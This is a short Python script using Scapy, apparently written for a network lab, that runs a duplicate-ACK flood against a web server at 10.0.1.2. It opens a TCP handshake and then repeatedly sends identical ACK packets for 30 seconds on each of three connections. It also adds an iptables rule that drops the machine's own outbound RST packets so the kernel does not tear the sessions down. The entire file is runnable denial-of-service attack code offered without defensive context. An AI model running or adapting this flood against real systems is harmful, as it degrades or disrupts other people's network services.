from scapy.all import *
import random
import time
import os

# ============================
# Scapy / OS Configuration
# ============================
conf.L3socket = L3RawSocket
conf.sniff_promisc = 0
conf.verb = 0

DST_IP = "10.0.1.2"
DST_PORT = 80
IFACE = "h1-eth0"

# ============================
# Attack Parameters
# ============================
N_CONNECTIONS = 3          # parallel TCP connections
ATTACK_DURATION = 30      # seconds per connection
INTER_CONN_DELAY = 0.5    # short pause between connections

conf.iface = IFACE

# ============================
# Helper: One TCP Session
# ============================
def run_one_connection(conn_id):
    print(f"[+] Starting connection {conn_id}")

    sport = random.randint(20000, 60000)
    init_seq = random.randint(10000, 50000)

    # ----------------------------
    # 1. TCP Handshake
    # ----------------------------
    syn = IP(dst=DST_IP)/TCP(
        sport=sport,
        dport=DST_PORT,
        flags="S",
        seq=init_seq
    )

    synack = sr1(syn, timeout=2, verbose=False)
    if not synack or TCP not in synack:
        print("[-] Handshake failed")
        return

    seq = synack.ack
    ack = synack.seq + 1

    ack_pkt = IP(dst=DST_IP)/TCP(
        sport=sport,
        dport=DST_PORT,
        flags="A",
        seq=seq,
        ack=ack
    )
    send(ack_pkt, verbose=False)

    print("[+] TCP handshake completed")

    # ----------------------------
    # 2. Sustained DUP-ACK Flood
    # ----------------------------
    dup_ack = IP(dst=DST_IP)/TCP(
        sport=sport,
        dport=DST_PORT,
        flags="A",
        seq=seq,   # unchanged
        ack=ack    # unchanged → duplicate ACK
    )

    end_time = time.time() + ATTACK_DURATION
    pkt_count = 0

    while time.time() < end_time:
        send(dup_ack, verbose=False)
        pkt_count += 1

    print(f"[+] Sent ~{pkt_count} DUP-ACKs on connection {conn_id}")

# ============================
# Main
# ============================

# Block outbound RSTs (critical)
os.system("iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP")

try:
    for i in range(1, N_CONNECTIONS + 1):
        run_one_connection(i)
        time.sleep(INTER_CONN_DELAY)
finally:
    os.system("iptables -D OUTPUT -p tcp --tcp-flags RST RST -j DROP")

print("[+] DUP-ACK flooding completed")
